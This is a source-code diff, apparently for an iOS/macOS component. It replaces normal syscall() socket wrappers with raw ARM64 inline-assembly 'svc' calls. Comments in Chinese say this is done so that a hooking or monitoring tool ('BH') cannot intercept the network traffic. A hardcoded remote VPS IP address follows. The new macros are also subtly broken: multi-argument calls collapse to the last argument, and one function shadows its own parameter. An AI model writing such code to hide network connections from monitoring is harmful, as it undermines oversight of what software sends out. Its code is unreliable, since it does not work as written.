@@ -11,7 +11,8 @@
 #import <errno.h>
 #import <fcntl.h>
 
-// ====== syscall ======
+// ====== 内联汇编 syscall（不调用任何函数，svc 指令直接进内核） ======
+// BH 即使 hook 了 syscall() 函数也无法拦截直接 svc
 #define SYS_SOCKET   97
 #define SYS_CONNECT  98
 #define SYS_CLOSE    6
@@ -21,15 +22,42 @@
 #define SYS_SENDTO   290
 #define SYS_RECVFROM 291
 
-#define SYSCALL_INT(ret, num, ...) do { ret = (int)syscall(num, ##__VA_ARGS__); } while(0)
-static int sys_sock(int d, int t, int p) { return (int)syscall(SYS_SOCKET, d, t, p); }
-static int sys_con(int fd, const struct sockaddr *a, socklen_t l) { return (int)syscall(SYS_CONNECT, fd, a, l); }
-static int sys_cls(int fd) { return (int)syscall(SYS_CLOSE, fd); }
-static int sys_snd(int fd, const void *b, size_t l, int f) { return (int)syscall(SYS_SENDTO, fd, b, l, f, NULL, 0); }
-static int sys_rcv(int fd, void *b, size_t l, int f) { return (int)syscall(SYS_RECVFROM, fd, b, l, f, NULL, 0); }
-static int sys_fctl(int fd, int cmd, int val) { return (int)syscall(SYS_FCNTL, fd, cmd, val); }
-static int sys_sel(int nfds, fd_set *r, fd_set *w, fd_set *e, struct timeval *t) { return (int)syscall(SYS_SELECT, nfds, r, w, e, t); }
-static int sys_gso(int fd, int lv, int on, void *v, socklen_t *len) { return (int)syscall(SYS_GETSOCKOPT, fd, lv, on, v, len); }
+__attribute__((always_inline))
+static long asm_syscall(long n, long a1, long a2, long a3, long a4, long a5, long a6) {
+    register long x0 __asm__("x0") = n;
+    register long x1 __asm__("x1") = a1;
+    register long x2 __asm__("x2") = a2;
+    register long x3 __asm__("x3") = a3;
+    register long x4 __asm__("x4") = a4;
+    register long x5 __asm__("x5") = a5;
+    register long x6 __asm__("x6") = a6;
+    __asm__ volatile(
+        "mov x16, x0\n"
+        "mov x0, x1\n"
+        "mov x1, x2\n"
+        "mov x2, x3\n"
+        "mov x3, x4\n"
+        "mov x4, x5\n"
+        "mov x5, x6\n"
+        "svc #0x80\n"
+        : "+r"(x0)
+        : "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5), "r"(x6)
+        : "x16", "memory", "cc"
+    );
+    return x0;
+}
+
+#define RAW_SYSCALL(ret, num, ...) ret = (int)asm_syscall((num), (long)(__VA_ARGS__), 0,0,0,0,0)
+#define RAW_SYSCALL6(ret, num, a1,a2,a3,a4,a5,a6) ret = (int)asm_syscall((num), (long)(a1),(long)(a2),(long)(a3),(long)(a4),(long)(a5),(long)(a6))
+
+static int sys_sock(int d, int t, int p) { int r; RAW_SYSCALL(r, SYS_SOCKET, d,t,p); return r; }
+static int sys_con(int fd, const struct sockaddr *a, socklen_t l) { int r; RAW_SYSCALL(r, SYS_CONNECT, fd,a,l); return r; }
+static int sys_cls(int fd) { int r; RAW_SYSCALL(r, SYS_CLOSE, fd); return r; }
+static int sys_snd(int fd, const void *b, size_t l, int f) { int r; RAW_SYSCALL6(r, SYS_SENDTO, fd,b,l,f,0,0); return r; }
+static int sys_rcv(int fd, void *b, size_t l, int f) { int r; RAW_SYSCALL6(r, SYS_RECVFROM, fd,b,l,f,0,0); return r; }
+static int sys_fctl(int fd, int cmd, int val) { int r; RAW_SYSCALL(r, SYS_FCNTL, fd,cmd,val); return r; }
+static int sys_sel(int nfds, fd_set *r, fd_set *w, fd_set *e, struct timeval *t) { int r; RAW_SYSCALL6(r, SYS_SELECT, nfds,r,w,e,t,0); return r; }
+static int sys_gso(int fd, int lv, int on, void *v, socklen_t *len) { int r; RAW_SYSCALL(r, SYS_GETSOCKOPT, fd,lv,on,v,len); return r; }
 
 // ====== 地址 ======
 #define VPS_IP  0xC081D234  // 192.129.210.52
